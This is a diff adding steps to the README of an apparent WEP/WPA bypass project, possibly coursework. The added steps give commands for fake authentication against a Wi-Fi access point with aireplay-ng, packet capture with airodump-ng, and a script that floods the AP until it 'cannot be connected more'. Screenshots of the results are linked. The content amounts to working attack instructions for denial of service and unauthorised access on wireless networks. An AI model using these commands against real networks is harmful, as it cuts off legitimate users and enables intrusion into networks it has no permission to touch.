@@ -43,6 +43,13 @@
   aireplay-ng -1 0 -e "Nhom 802.11" -y <keystream.xor> -a <MAC AP> -h AA:AA:AA:AA:AA:AA wlan0mon
   ```
   ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/de87245a-4bef-4b29-a673-68561f6d26dd)
+  - Run attack.py, then you must open another terminal and run `airodump-ng wlan0mon -c <channel> --bssid <mac AP> -w keystream `
+  ```
+  ./attack.sh <number you want> <mac AP> <wireless adapter>
+  ```
+  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/502d55a6-8136-4076-8cb7-eaa542d9b03b)
+   > Below is overload, cannot be connected more
+  ![image](https://github.com/hoangbui24/WEP_WPA_Bypass/assets/71567852/294b804f-8b2e-4c38-9751-b9cbc35987d8)
 
 
   
